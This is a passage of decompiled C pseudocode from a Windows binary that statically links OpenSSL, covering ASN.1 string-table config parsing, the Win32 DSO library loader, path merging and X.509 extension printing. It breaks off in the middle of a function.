  if ( !dword_5393C8 && (v13 = sub_426AF0(), (dword_5393C8 = (int)v13) == 0) || !sub_4269B0(v13, (int)v3) )
  {
    sub_4162A0((volatile LONG *)v3);
    goto LABEL_42;
  }
LABEL_45:
  v18 = 1;
  sub_429F60((volatile LONG *)v3);
  return v18;
}
// 5393C8: using guessed type int dword_5393C8;

//----- (004C8290) --------------------------------------------------------
BOOL sub_4C8290()
{
  return sub_441080("engines", sub_4C81B0, sub_4C8240);
}
// 4C81B0: using guessed type int sub_4C81B0();
// 4C8240: using guessed type int sub_4C8240();

//----- (004C82C0) --------------------------------------------------------
int __cdecl sub_4C82C0(const char *Src, const char *a2)
{
  const char *v2; // esi
  int v3; // edi
  int *v4; // ebp
  int v5; // ebx
  int *v6; // eax
  unsigned int v7; // eax
  bool v8; // zf
  unsigned int v9; // eax
  int v10; // esi
  char *EndPtr; // [esp+10h] [ebp-1Ch] BYREF
  int v13; // [esp+14h] [ebp-18h]
  int v14; // [esp+18h] [ebp-14h] BYREF
  int v15; // [esp+1Ch] [ebp-10h]
  int v16; // [esp+20h] [ebp-Ch]
  int v17; // [esp+24h] [ebp-8h]
  int v18; // [esp+28h] [ebp-4h]

  v2 = a2;
  v3 = 0;
  v18 = 0;
  v16 = -1;
  v15 = -1;
  v14 = 0;
  v4 = 0;
  v5 = 0;
  v17 = sub_423B70(a2);
  if ( (v17 || (v17 = sub_423A80(a2)) != 0) && (v6 = (int *)sub_44D8A0(Src), (v4 = v6) != 0) )
  {
    v13 = 0;
    if ( sub_426A30((int)v6) > 0 )
    {
      do
      {
        v5 = sub_426A40(v4, v13);
        if ( !strcmp(*(const char **)(v5 + 4), "min") )
        {
          v7 = strtoul(*(const char **)(v5 + 8), &EndPtr, 0);
          v8 = *EndPtr == 0;
          v16 = v7;
          if ( !v8 )
            goto LABEL_7;
        }
        else if ( !strcmp(*(const char **)(v5 + 4), "max") )
        {
          v9 = strtoul(*(const char **)(v5 + 8), &EndPtr, 0);
          v8 = *EndPtr == 0;
          v15 = v9;
          if ( !v8 )
            goto LABEL_7;
        }
        else if ( !strcmp(*(const char **)(v5 + 4), "mask") )
        {
          if ( !sub_47E8C0(*(char **)(v5 + 8), &v14) || !v14 )
          {
LABEL_7:
            v2 = a2;
            goto LABEL_8;
          }
        }
        else
        {
          if ( strcmp(*(const char **)(v5 + 4), "flags") )
            goto LABEL_7;
          if ( !strcmp(*(const char **)(v5 + 8), "nomask") )
          {
            v3 = 2;
          }
          else
          {
            if ( strcmp(*(const char **)(v5 + 8), "none") )
              goto LABEL_7;
            v3 = 1;
          }
        }
        v10 = ++v13;
      }
      while ( v10 < sub_426A30((int)v4) );
    }
    v18 = sub_47F7C0(v17, v16, v15, v14, v3);
    if ( !v18 )
      sub_408310(13, 222, 65, "crypto\\asn1\\asn_mstbl.c", 110);
  }
  else
  {
LABEL_8:
    sub_408310(13, 222, 218, "crypto\\asn1\\asn_mstbl.c", 100);
    if ( v5 )
      sub_408610(4, "field=", *(_DWORD *)(v5 + 4), ", value=", *(_DWORD *)(v5 + 8));
    else
      sub_408610(4, "name=", v2, ", value=", Src);
  }
  sub_426C00(v4, (void (__cdecl *)(_DWORD))sub_44D000);
  return v18;
}
// 408310: using guessed type _DWORD __cdecl sub_408310(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (004C85E0) --------------------------------------------------------
int __cdecl sub_4C85E0(int a1, int a2)
{
  int v2; // eax
  int v3; // eax
  int *v4; // edi
  int v6; // esi
  int v7; // eax

  v2 = sub_432B60(a1);
  v3 = sub_4629F0(a2, v2);
  v4 = (int *)v3;
  if ( v3 )
  {
    v6 = 0;
    if ( sub_426A30(v3) <= 0 )
    {
      return 1;
    }
    else
    {
      while ( 1 )
      {
        v7 = sub_426A40(v4, v6);
        if ( !sub_4C82C0(*(const char **)(v7 + 8), *(const char **)(v7 + 4)) )
          break;
        if ( ++v6 >= sub_426A30((int)v4) )
          return 1;
      }
      sub_408310(13, 223, 219, "crypto\\asn1\\asn_mstbl.c", 36);
      return 0;
    }
  }
  else
  {
    sub_408310(13, 223, 172, "crypto\\asn1\\asn_mstbl.c", 30);
    return 0;
  }
}
// 408310: using guessed type _DWORD __cdecl sub_408310(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (004C8690) --------------------------------------------------------
BOOL sub_4C8690()
{
  return sub_441080("stbl_section", sub_4C85E0, sub_4C82B0);
}
// 4C82B0: using guessed type int sub_4C82B0();

//----- (004C86B0) --------------------------------------------------------
int __cdecl sub_4C86B0(const char *a1)
{
  const char *v1; // ecx
  char *v2; // ebx
  char *v3; // eax
  char *v4; // esi
  const char *v5; // ebp
  char *v6; // edi
  unsigned __int8 v7; // al
  int v9; // ecx
  int v10; // ecx
  int v11; // edx
  unsigned __int8 *v12; // esi
  int v13; // eax
  unsigned __int8 *v14; // esi
  char *v15; // eax
  char *v16; // edi
  void *v17; // [esp+10h] [ebp-4h]

  v2 = (char *)v1;
  v3 = strrchr(v1, 44);
  v4 = v3;
  if ( v3 )
  {
    v7 = v3[1];
    v6 = v4 + 1;
    v5 = 0;
    if ( !v7 )
      return 0;
    if ( isspace(v7) )
    {
      do
        v9 = (unsigned __int8)*++v6;
      while ( isspace(v9) );
    }
  }
  else
  {
    v5 = a1;
    v6 = v2;
  }
  v17 = sub_423D50(v6, a1, v5);
  if ( !v17 )
    return 0;
  if ( v4 )
  {
    if ( isspace((unsigned __int8)*v2) )
    {
      do
        v10 = (unsigned __int8)*++v2;
      while ( isspace(v10) );
    }
    v11 = (unsigned __int8)*(v4 - 1);
    v12 = (unsigned __int8 *)(v4 - 1);
    if ( isspace(v11) )
    {
      while ( v12 != (unsigned __int8 *)v2 )
      {
        v13 = *--v12;
        if ( !isspace(v13) )
          goto LABEL_14;
      }
      return 0;
    }
LABEL_14:
    v14 = v12 + 1;
    v15 = (char *)sub_4133F0(v14 - (unsigned __int8 *)v2 + 1);
    v16 = v15;
    if ( v15 )
    {
      memcpy(v15, v2, v14 - (unsigned __int8 *)v2);
      v14[v16 - v2] = 0;
      sub_423310((unsigned int)v17)[1] = v16;
      return 1;
    }
    return 0;
  }
  return 1;
}
// 4C86BE: variable 'v1' is possibly undefined

//----- (004C8870) --------------------------------------------------------
BOOL sub_4C8870()
{
  return sub_441080("oid_section", sub_4C87D0, nullsub_1);
}
// 4416D0: using guessed type int nullsub_1();
// 4C87D0: using guessed type int sub_4C87D0();

//----- (004C8890) --------------------------------------------------------
char **sub_4C8890()
{
  return &off_53565C;
}
// 53565C: using guessed type char *off_53565C;

//----- (004C88A0) --------------------------------------------------------
int __cdecl sub_4C88A0(int a1)
{
  void *v1; // esi
  HMODULE LibraryA; // edi
  const CHAR *v3; // eax
  CHAR *v4; // ebx
  _DWORD *v5; // eax

  v1 = 0;
  LibraryA = 0;
  v3 = (const CHAR *)sub_460FC0(a1, 0);
  v4 = (CHAR *)v3;
  if ( v3 )
  {
    LibraryA = LoadLibraryA(v3);
    if ( LibraryA )
    {
      v5 = sub_4133F0(4u);
      v1 = v5;
      if ( v5 )
      {
        *v5 = LibraryA;
        if ( sub_4269B0(*(int **)(a1 + 4), (int)v5) )
        {
          *(_DWORD *)(a1 + 32) = v4;
          return 1;
        }
        sub_408310(37, 120, 105, (int)"crypto\\dso\\dso_win32.c", 116);
      }
      else
      {
        sub_408310(37, 120, 65, (int)"crypto\\dso\\dso_win32.c", 111);
      }
    }
    else
    {
      sub_408310(37, 120, 103, (int)"crypto\\dso\\dso_win32.c", 105);
      sub_408610(3, "filename(", v4, ")");
    }
  }
  else
  {
    sub_408310(37, 120, 111, (int)"crypto\\dso\\dso_win32.c", 100);
  }
  sub_413490(v4);
  sub_413490(v1);
  if ( LibraryA )
    FreeLibrary(LibraryA);
  return 0;
}

//----- (004C8990) --------------------------------------------------------
int __cdecl sub_4C8990(int a1)
{
  HMODULE *v2; // esi

  if ( a1 )
  {
    if ( sub_426A30(*(_DWORD *)(a1 + 4)) >= 1 )
    {
      v2 = (HMODULE *)sub_4269D0(*(int **)(a1 + 4));
      if ( v2 )
      {
        if ( FreeLibrary(*v2) )
        {
          sub_413490(v2);
          return 1;
        }
        else
        {
          sub_408310(37, 121, 107, (int)"crypto\\dso\\dso_win32.c", 146);
          sub_4269B0(*(int **)(a1 + 4), (int)v2);
          return 0;
        }
      }
      else
      {
        sub_408310(37, 121, 104, (int)"crypto\\dso\\dso_win32.c", 142);
        return 0;
      }
    }
    else
    {
      return 1;
    }
  }
  else
  {
    sub_408310(37, 121, 67, (int)"crypto\\dso\\dso_win32.c", 135);
    return 0;
  }
}

//----- (004C8A50) --------------------------------------------------------
FARPROC __cdecl sub_4C8A50(int a1, LPCSTR lpProcName)
{
  FARPROC result; // eax
  int v3; // eax
  HMODULE *v4; // eax

  if ( a1 && lpProcName )
  {
    if ( sub_426A30(*(_DWORD *)(a1 + 4)) >= 1 )
    {
      v3 = sub_426A30(*(_DWORD *)(a1 + 4));
      v4 = (HMODULE *)sub_426A40(*(int **)(a1 + 4), v3 - 1);
      if ( v4 )
      {
        result = GetProcAddress(*v4, lpProcName);
        if ( !result )
        {
          sub_408310(37, 101, 106, (int)"crypto\\dso\\dso_win32.c", 181);
          sub_408610(3, "symname(", lpProcName, ")");
          return 0;
        }
      }
      else
      {
        sub_408310(37, 101, 104, (int)"crypto\\dso\\dso_win32.c", 176);
        return 0;
      }
    }
    else
    {
      sub_408310(37, 101, 105, (int)"crypto\\dso\\dso_win32.c", 171);
      return 0;
    }
  }
  else
  {
    sub_408310(37, 101, 67, (int)"crypto\\dso\\dso_win32.c", 167);
    return 0;
  }
  return result;
}

//----- (004C8B30) --------------------------------------------------------
_DWORD *__usercall sub_4C8B30@<eax>(_BYTE *a1@<ecx>, int a2@<ebx>)
{
  _BYTE *v2; // esi
  _BYTE *v3; // ebp
  _DWORD *v5; // edi
  int v6; // eax
  char v7; // dl
  _BYTE *v8; // eax
  _BYTE *v9; // ecx
  _BYTE *v10; // ecx
  int v11; // ecx

  v2 = a1;
  v3 = a1;
  if ( !a1 )
  {
    sub_408310(37, 136, 111, (int)"crypto\\dso\\dso_win32.c", 210);
    return 0;
  }
  v5 = sub_413430(0x28u);
  if ( !v5 )
  {
    sub_408310(37, 136, 65, (int)"crypto\\dso\\dso_win32.c", 219);
    return 0;
  }
  v6 = 1;
  if ( *v2 == 92 && v2[1] == 92 || *v2 == 47 && v2[1] == 47 )
  {
    v6 = 0;
    v2 += 2;
    v3 = v2;
    *v5 = v2;
  }
  while ( 2 )
  {
    v7 = *v2;
    switch ( *v2 )
    {
      case 0:
        v11 = v2 - v3;
        if ( v6 )
        {
          if ( v11 > 0 )
          {
            if ( a2 )
            {
              if ( v6 == 1 )
              {
                v5[6] = v3;
                v5[7] = 0;
              }
              v5[7] += v2 - v3;
            }
            else
            {
              v5[8] = v3;
              v5[9] = v11;
            }
          }
        }
        else
        {
          v5[1] = v11;
        }
        goto LABEL_28;
      case 0x2F:
      case 0x5C:
        if ( v6 )
        {
          v10 = (_BYTE *)(++v2 - v3);
          if ( v6 == 1 )
          {
            v5[6] = v3;
            v6 = 2;
            v5[7] = v10;
          }
          else
          {
            v5[7] += v10;
          }
          v3 = v2;
        }
        else
        {
          v9 = (_BYTE *)(v2 - v3);
          ++v2;
          v5[1] = v9;
          v6 = 2;
          v3 = v2;
          v5[6] = v2;
        }
        goto LABEL_28;
      case 0x3A:
        if ( v6 != 1 )
        {
          sub_408310(37, 136, 115, (int)"crypto\\dso\\dso_win32.c", 238);
          sub_413490(v5);
          return 0;
        }
        v8 = (_BYTE *)(v2 - v3);
        ++v2;
        v5[2] = v3;
        v5[3] = v8;
        v6 = 2;
        v3 = v2;
        v5[6] = v2;
LABEL_28:
        if ( v7 )
          continue;
        if ( !v5[1] )
          *v5 = 0;
        if ( !v5[3] )
          v5[2] = 0;
        if ( !v5[7] )
          v5[6] = 0;
        if ( !v5[9] )
          v5[8] = 0;
        return v5;
      default:
        ++v2;
        goto LABEL_28;
    }
  }
}

//----- (004C8D40) --------------------------------------------------------
char *__cdecl sub_4C8D40(int a1, char *Str)
{
  unsigned int v2; // esi
  int v3; // ebx
  size_t v4; // esi
  char *v5; // eax
  char *v6; // esi

  v2 = strlen(Str);
  if ( strstr(Str, "/") || strstr(Str, word_52F7B8) || strstr(Str, word_4F1980) )
  {
    v3 = 0;
    v4 = v2 + 1;
  }
  else
  {
    v3 = 1;
    v4 = v2 + 5;
  }
  v5 = (char *)sub_4133F0(v4);
  v6 = v5;
  if ( v5 )
  {
    if ( v3 )
      sprintf(v5, "%s.dll", Str);
    else
      sprintf(v5, "%s", Str);
    return v6;
  }
  else
  {
    sub_408310(37, 125, 109, (int)"crypto\\dso\\dso_win32.c", 474);
    return 0;
  }
}

//----- (004C8E10) --------------------------------------------------------
FARPROC __cdecl sub_4C8E10(const CHAR *a1)
{
  HMODULE LibraryW; // eax
  HMODULE v2; // esi
  HANDLE (__stdcall *CreateToolhelp32Snapshot)(DWORD, DWORD); // edi
  BOOL (__stdcall *Module32First)(HANDLE, LPMODULEENTRY32); // ebp
  HANDLE v6; // eax
  void *v7; // edi
  FARPROC ProcAddress; // ebp
  BOOL (__stdcall *Module32Next)(HANDLE, LPMODULEENTRY32); // [esp+10h] [ebp-230h]
  int v10[137]; // [esp+18h] [ebp-228h] BYREF

  LibraryW = LoadLibraryW(L"KERNEL32.DLL");
  v2 = LibraryW;
  if ( !LibraryW )
  {
    sub_408310(37, 142, 108, (int)"crypto\\dso\\dso_win32.c", 524);
    return 0;
  }
  CreateToolhelp32Snapshot = (HANDLE (__stdcall *)(DWORD, DWORD))GetProcAddress(LibraryW, "CreateToolhelp32Snapshot");
  if ( !CreateToolhelp32Snapshot )
  {
    FreeLibrary(v2);
    sub_408310(37, 142, 108, (int)"crypto\\dso\\dso_win32.c", 532);
    return 0;
  }
  Module32First = (BOOL (__stdcall *)(HANDLE, LPMODULEENTRY32))GetProcAddress(v2, "Module32First");
  Module32Next = (BOOL (__stdcall *)(HANDLE, LPMODULEENTRY32))GetProcAddress(v2, "Module32Next");
  v6 = CreateToolhelp32Snapshot(8, 0);
  v7 = v6;
  if ( v6 == (HANDLE)-1 )
  {
    FreeLibrary(v2);
    sub_408310(37, 142, 108, (int)"crypto\\dso\\dso_win32.c", 548);
    return 0;
  }
  v10[0] = 548;
  if ( !Module32First(v6, (LPMODULEENTRY32)v10) )
  {
LABEL_10:
    CloseHandle(v7);
    FreeLibrary(v2);
    return 0;
  }
  while ( 1 )
  {
    ProcAddress = GetProcAddress((HMODULE)v10[7], a1);
    if ( ProcAddress )
      break;
    if ( !Module32Next(v7, (LPMODULEENTRY32)v10) )
      goto LABEL_10;
  }
  CloseHandle(v7);
  FreeLibrary(v2);
  return ProcAddress;
}

//----- (004C8F90) --------------------------------------------------------
char *__usercall sub_4C8F90@<eax>(int a1@<esi>)
{
  int v1; // eax
  int v2; // edi
  char *result; // eax
  int v4; // eax
  int v5; // eax
  int v6; // eax
  char *v7; // eax
  char *v8; // ebp
  const char *v9; // eax
  const char *v10; // ecx
  int v11; // edx
  const char *v12; // eax
  unsigned int v13; // ecx
  const char *v14; // ebx
  int v15; // ebx
  int v16; // edi
  const char *v17; // ecx
  int v18; // edx
  const char *v19; // eax
  unsigned int v20; // ecx
  const char *v21; // ebx
  int v22; // ebx
  int v23; // edi
  int v24; // [esp+4h] [ebp-8h]
  const char *v25; // [esp+4h] [ebp-8h]
  int v26; // [esp+4h] [ebp-8h]
  const char *v27; // [esp+4h] [ebp-8h]
  const char *v28; // [esp+8h] [ebp-4h]
  const char *v29; // [esp+8h] [ebp-4h]

  v1 = 0;
  v2 = 0;
  if ( !a1 )
  {
    sub_408310(37, 135, 67, (int)"crypto\\dso\\dso_win32.c", 314);
    return 0;
  }
  if ( *(_DWORD *)a1 )
  {
    v1 = *(_DWORD *)(a1 + 4) + 2;
    if ( *(_DWORD *)(a1 + 16) || *(_DWORD *)(a1 + 24) || *(_DWORD *)(a1 + 32) )
      goto LABEL_11;
  }
  else if ( *(_DWORD *)(a1 + 8) )
  {
    v1 = *(_DWORD *)(a1 + 12);
LABEL_11:
    ++v1;
  }
  v4 = *(_DWORD *)(a1 + 20) + v1;
  if ( *(_DWORD *)(a1 + 16) && (*(_DWORD *)(a1 + 24) || *(_DWORD *)(a1 + 32)) )
    ++v4;
  v5 = *(_DWORD *)(a1 + 28) + v4;
  if ( *(_DWORD *)(a1 + 24) && *(_DWORD *)(a1 + 32) )
    ++v5;
  v6 = *(_DWORD *)(a1 + 36) + v5;
  if ( !v6 )
  {
    sub_408310(37, 135, 113, (int)"crypto\\dso\\dso_win32.c", 335);
    return 0;
  }
  v7 = (char *)sub_4133F0(v6 + 1);
  v8 = v7;
  if ( !v7 )
  {
    sub_408310(37, 135, 65, (int)"crypto\\dso\\dso_win32.c", 341);
    return 0;
  }
  if ( *(_DWORD *)a1 )
  {
    strcpy(v7, "\\\\");
    strncpy(v7 + 2, *(const char **)a1, *(_DWORD *)(a1 + 4));
    v2 = *(_DWORD *)(a1 + 4) + 2;
    if ( !*(_DWORD *)(a1 + 16) && !*(_DWORD *)(a1 + 24) && !*(_DWORD *)(a1 + 32) )
      goto LABEL_31;
    v8[v2] = 92;
    goto LABEL_30;
  }
  v9 = *(const char **)(a1 + 8);
  if ( v9 )
  {
    strncpy(v8, v9, *(_DWORD *)(a1 + 12));
    v2 = *(_DWORD *)(a1 + 12);
    v8[v2] = 58;
LABEL_30:
    ++v2;
  }
LABEL_31:
  v10 = *(const char **)(a1 + 16);
  v11 = *(_DWORD *)(a1 + 20);
  v12 = v10;
  if ( v11 > 0 )
  {
    do
    {
      v28 = &v10[v11];
      v13 = &v10[v11] - v12;
      v24 = 0;
      v14 = v12;
      if ( v13 )
      {
        while ( *v14 )
        {
          if ( *v14 == 47 )
          {
            v25 = v14;
            goto LABEL_37;
          }
          ++v14;
          if ( ++v24 >= v13 )
            break;
        }
      }
      v25 = v28;
LABEL_37:
      v15 = v25 - v12;
      strncpy(&v8[v2], v12, v25 - v12);
      v16 = v15 + v2;
      v8[v16] = 92;
      v10 = *(const char **)(a1 + 16);
      v11 = *(_DWORD *)(a1 + 20);
      v12 = v25 + 1;
      v2 = v16 + 1;
    }
    while ( v11 > v25 + 1 - v10 );
  }
  v17 = *(const char **)(a1 + 24);
  v18 = *(_DWORD *)(a1 + 28);
  v19 = v17;
  if ( v18 > 0 )
  {
    do
    {
      v29 = &v17[v18];
      v20 = &v17[v18] - v19;
      v26 = 0;
      v21 = v19;
      if ( v20 )
      {
        while ( *v21 )
        {
          if ( *v21 == 47 )
          {
            v27 = v21;
            goto LABEL_44;
          }
          ++v21;
          if ( ++v26 >= v20 )
            break;
        }
      }
      v27 = v29;
LABEL_44:
      v22 = v27 - v19;
      strncpy(&v8[v2], v19, v27 - v19);
      v23 = v22 + v2;
      v8[v23] = 92;
      v17 = *(const char **)(a1 + 24);
      v18 = *(_DWORD *)(a1 + 28);
      v19 = v27 + 1;
      v2 = v23 + 1;
    }
    while ( v18 > v27 + 1 - v17 );
  }
  strncpy(&v8[v2], *(const char **)(a1 + 32), *(_DWORD *)(a1 + 36));
  result = v8;
  v8[*(_DWORD *)(a1 + 36) + v2] = 0;
  return result;
}
// 50CC5C: using guessed type __int16 word_50CC5C;

//----- (004C91F0) --------------------------------------------------------
char *__cdecl sub_4C91F0(int a1, char *a2, char *a3)
{
  _DWORD *v3; // esi
  _DWORD *v4; // ebx
  char *v6; // edi
  _DWORD *v7; // eax
  char *v8; // eax
  char v9; // al

  v3 = 0;
  v4 = 0;
  if ( a2 )
  {
    if ( a3 )
    {
      v3 = sub_4C8B30(a2, 0);
      if ( !v3 )
      {
        sub_408310(37, 134, 65, (int)"crypto\\dso\\dso_win32.c", 421);
        return 0;
      }
      v7 = sub_4C8B30(a3, 1);
      v4 = v7;
      if ( !v7 )
      {
        sub_408310(37, 134, 65, (int)"crypto\\dso\\dso_win32.c", 426);
        sub_413490(v3);
        return 0;
      }
      if ( !*v3 && !v3[2] )
      {
        *v3 = *v7;
        v3[1] = v7[1];
        v3[2] = v7[2];
        v3[3] = v7[3];
      }
      v8 = (char *)v3[6];
      if ( v8 )
      {
        v9 = *v8;
        if ( v9 != 92 && v9 != 47 )
        {
          v3[4] = v4[6];
          v3[5] = v4[7];
        }
      }
      else
      {
        v3[6] = v4[6];
        v3[7] = v4[7];
      }
      if ( !v3[8] )
      {
        v3[8] = v4[8];
        v3[9] = v4[9];
      }
      v6 = sub_4C8F90((int)v3);
    }
    else
    {
      v6 = (char *)sub_4133F0(strlen(a2) + 1);
      if ( !v6 )
      {
        sub_408310(37, 134, 65, (int)"crypto\\dso\\dso_win32.c", 407);
        return 0;
      }
      strcpy(v6, a2);
    }
  }
  else
  {
    if ( !a3 )
    {
      sub_408310(37, 134, 67, (int)"crypto\\dso\\dso_win32.c", 401);
      return 0;
    }
    v6 = (char *)sub_4133F0(strlen(a3) + 1);
    if ( !v6 )
    {
      sub_408310(37, 134, 65, (int)"crypto\\dso\\dso_win32.c", 414);
      return 0;
    }
    strcpy(v6, a3);
  }
  sub_413490(v3);
  sub_413490(v4);
  return v6;
}

//----- (004C93E0) --------------------------------------------------------
void __cdecl sub_4C93E0(int a1, int *a2, int a3, int a4)
{
  int i; // edi
  int v5; // eax
  const char *v6; // ecx
  const char *v7; // eax

  if ( a2 )
  {
    if ( !a4 || !sub_426A30((int)a2) )
    {
      sub_419190(a1, "%*s", a3, byte_4F1291);
      if ( !sub_426A30((int)a2) )
        sub_4051D0(a1, (int)"<EMPTY>\n");
    }
    for ( i = 0; i < sub_426A30((int)a2); ++i )
    {
      if ( a4 )
      {
        sub_419190(a1, "%*s", a3, byte_4F1291);
      }
      else if ( i > 0 )
      {
        sub_419190(a1, ", ");
      }
      v5 = sub_426A40(a2, i);
      v6 = *(const char **)(v5 + 4);
      v7 = *(const char **)(v5 + 8);
      if ( v6 )
      {
        if ( v7 )
          sub_419190(a1, "%s:%s", v6, v7);
        else
          sub_4051D0(a1, (int)v6);
      }
      else
      {
        sub_4051D0(a1, (int)v7);
      }
      if ( a4 )
        sub_4051D0(a1, (int)"\n");
    }
  }
}

//----- (004C94F0) --------------------------------------------------------
int __usercall sub_4C94F0@<eax>(signed int Size@<ecx>, int a2@<edx>, int a3@<edi>, int a4@<esi>, int a5, int a6)
{
  int v6; // eax

  v6 = a5 & 0xF0000;
  if ( (a5 & 0xF0000u) > 0x20000 )
  {
    if ( v6 == 196608 )
      return sub_439DC0(a2, a3, a4, Size);
    return 1;
  }
  if ( (a5 & 0xF0000) == 0x20000 )
    return sub_455990(a2, a3, a4, Size, -1);
  if ( !v6 )
    return 0;
  if ( v6 != 0x10000 )
    return 1;
  if ( a6 )
    sub_419190(a2, "%*s<Parse Error>", Size, byte_4F1291);
  else
    sub_419190(a2, "%*s<Not Supported>", Size, byte_4F1291);
  return 1;
}

//----- (004C9570) --------------------------------------------------------
int __cdecl sub_4C9570(int a1, int a2, int a3, signed int Size)
{
  int *v4; // ebp
  int v5; // esi
  int v6; // esi
  int v7; // eax
  int v8; // edi
  int v9; // eax
  int (*v11)(void); // eax
  int v12; // eax
  int v13; // eax
  int v14; // ebx
  int (__cdecl *v15)(int, int); // eax
  void *v16; // eax
  int (__cdecl *v17)(int, int, _DWORD); // eax
  int (__cdecl *v18)(int, int, int, signed int); // eax
  int (*v19)(void); // eax
  int v20; // eax
  int v21; // [esp+Ch] [ebp-Ch] BYREF
  int v22; // [esp+10h] [ebp-8h]
  void *Block; // [esp+14h] [ebp-4h]

  v4 = 0;
  Block = 0;
  v22 = 1;
  v5 = sub_4319D0(a2);
  v21 = sub_432B60(v5);
  v6 = sub_435D30(v5);
  v7 = sub_44CCF0(a2);
  v8 = v7;
  if ( v7 )
  {
    v11 = *(int (**)(void))(v7 + 8);
    if ( v11 )
    {
      v12 = v11();
      v13 = sub_42E9C0(0, (void **)&v21, v6, v12);
    }
    else
    {
      v13 = (*(int (__cdecl **)(_DWORD, int *, int))(v8 + 20))(0, &v21, v6);
    }
    v14 = v13;
    if ( !v13 )
      return sub_4C94F0(Size, a1, v21, v6, a3, 1);
    v15 = *(int (__cdecl **)(int, int))(v8 + 28);
    if ( v15 )
    {
      v16 = (void *)v15(v8, v14);
      Block = v16;
      if ( v16 )
      {
        sub_419190(a1, "%*s%s", Size, byte_4F1291, (const char *)v16);
        goto LABEL_27;
      }
LABEL_26:
      v22 = 0;
      goto LABEL_27;
    }
    v17 = *(int (__cdecl **)(int, int, _DWORD))(v8 + 36);
    if ( v17 )
    {
      v4 = (int *)v17(v8, v14, 0);
      if ( v4 )
        sub_4C93E0(a1, v4, Size, *(_DWORD *)(v8 + 4) & 4);
      else
        v22 = 0;
    }
    else
    {
      v18 = *(int (__cdecl **)(int, int, int, signed int))(v8 + 44);
      if ( !v18 || !v18(v8, v14, a1, Size) )
        goto LABEL_26;
    }
LABEL_27:
    sub_426C00(v4, (void (__cdecl *)(_DWORD))sub_44D000);
    sub_413490(Block);
    v19 = *(int (**)(void))(v8 + 8);
    if ( v19 )
    {
      v20 = v19();
      sub_42FEF0(v14, v20);
    }
    else
    {
      (*(void (__cdecl **)(int))(v8 + 16))(v14);
    }
    return v22;
  }
  v9 = a3 & 0xF0000;
  if ( (a3 & 0xF0000u) <= 0x20000 )
  {
    if ( (a3 & 0xF0000) == 0x20000 )
      return sub_455990(a1, v21, v6, Size, -1);
    if ( !v9 )
      return 0;
    if ( v9 == 0x10000 )
    {
      sub_419190(a1, "%*s<Not Supported>", Size, byte_4F1291);
      return 1;
    }
    return 1;
  }
  if ( v9 != 196608 )
    return 1;
  return sub_439DC0(a1, v21, v6, Size);
}

//----- (004C97A0) --------------------------------------------------------
int __cdecl sub_4C97A0(int a1, const char *a2, int a3, int a4, int a5)
{
  int *v5; // edi
  int v7; // ebp
  int v8; // edi
  int v9; // eax
  bool v10; // zf
  const char *v11; // eax
  int *v12; // eax
  int v13; // [esp+4h] [ebp-4h]

  v5 = (int *)a3;
  if ( sub_426A30(a3) <= 0 )
    return 1;
  v7 = a5;
  if ( a2 )
  {
    sub_419190(a1, "%*s%s:\n", a5, byte_4F1291, a2);
    v7 = a5 + 4;
  }
  v13 = 0;
  if ( sub_426A30(a3) <= 0 )
    return 1;
  while ( 1 )
  {
    v8 = sub_426A40(v5, v13);
    if ( v7 )
    {
      if ( sub_419190(a1, "%*s", v7, byte_4F1291) <= 0 )
        break;
    }
    v9 = sub_445DB0(v8);
    sub_422A00(a1, v9);
    v10 = !sub_4319E0(v8);
    v11 = "critical";
    if ( v10 )
      v11 = byte_4F1291;
    if ( sub_419190(a1, ": %s\n", v11) <= 0 )
      break;
    if ( !sub_4C9570(a1, v8, a4, v7 + 4) )
    {
      sub_419190(a1, "%*s", v7 + 4, byte_4F1291);
      v12 = (int *)sub_4319D0(v8);
      sub_47F5D0(a1, v12);
    }
    if ( sub_405110(a1, (int)"\n", 1) <= 0 )
      break;
    if ( ++v13 >= sub_426A30(a3) )
      return 1;
    v5 = (int *)a3;
  }
  return 0;
}

//----- (004C9900) --------------------------------------------------------
char **sub_4C9900()
{
  return &off_535684;
}
// 535684: using guessed type char *off_535684;

//----- (004C9910) --------------------------------------------------------
void *__cdecl sub_4C9910(int a1)
{
  void *result; // eax
  void *v2; // esi

  result = sub_4133F0(0xCu);
  v2 = result;
  if ( result )
  {
    if ( (*(int (__cdecl **)(void *))(a1 + 8))(result) )
    {
      return v2;
    }
    else
    {
      sub_413490(v2);
      return 0;
    }
  }
  return result;
}

//----- (004C9960) --------------------------------------------------------
int __cdecl sub_4C9960(_DWORD *a1)
{
  int result; // eax

  result = (int)a1;
  if ( a1 )
  {
    *a1 = &off_535684;
    a1[1] = "\b";
    a1[2] = 0;
    return 1;
  }
  return result;
}
// 535684: using guessed type char *off_535684;

//----- (004C9990) --------------------------------------------------------
int __cdecl sub_4C9990(_DWORD *a1)
{
  int result; // eax

  result = (int)a1;
  if ( a1 )
  {
    *a1 = &off_5356AC;
    a1[1] = &unk_52A8E8;
    a1[2] = 0;
    return 1;
  }
  return result;
}
// 5356AC: using guessed type char *off_5356AC;

//----- (004C99C0) --------------------------------------------------------
int __cdecl sub_4C99C0(_DWORD *Block)
{
  int result; // eax

  result = (int)Block;
  if ( Block )
  {
    sub_4CAAE0(Block);
    return 1;
  }
  return result;
}

//----- (004C99E0) --------------------------------------------------------
int __cdecl sub_4C99E0(int a1, const char *a2, void **a3)
{
  char *v3; // ecx
  int v4; // ebx
  char *v5; // esi
  _DWORD *v6; // edi
  char v8; // al
  int v9; // ecx
  __int16 v10; // dx
  int v11; // edi
  unsigned __int8 v12; // al
  __int16 i; // dx
  int v14; // edx
  char v15; // al
  unsigned __int8 v16; // al
  unsigned __int8 v17; // dl
  char *v18; // eax
  char *v19; // edi
  int v20; // edx
  int v21; // edx
  const char *v22; // ecx
  int v23; // eax
  int v24; // edx
  int v25; // eax
  char *v26; // ebp
  char j; // al
  _DWORD *Block; // [esp+Ch] [ebp-1Ch]
  int v29; // [esp+10h] [ebp-18h]
  char *VarName; // [esp+14h] [ebp-14h]
  char *v31; // [esp+18h] [ebp-10h]
  char v32; // [esp+1Ch] [ebp-Ch]
  char v33; // [esp+20h] [ebp-8h]
  char *v34; // [esp+24h] [ebp-4h]

  v4 = 0;
  v5 = v3;
  v32 = 0;
  v6 = sub_4197E0();
  Block = v6;
  if ( !v6 )
    return 0;
  if ( !sub_4198C0((int)v6, strlen(v5) + 1) )
    goto LABEL_62;
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            v8 = *v5;
            v9 = *(_DWORD *)(a1 + 4);
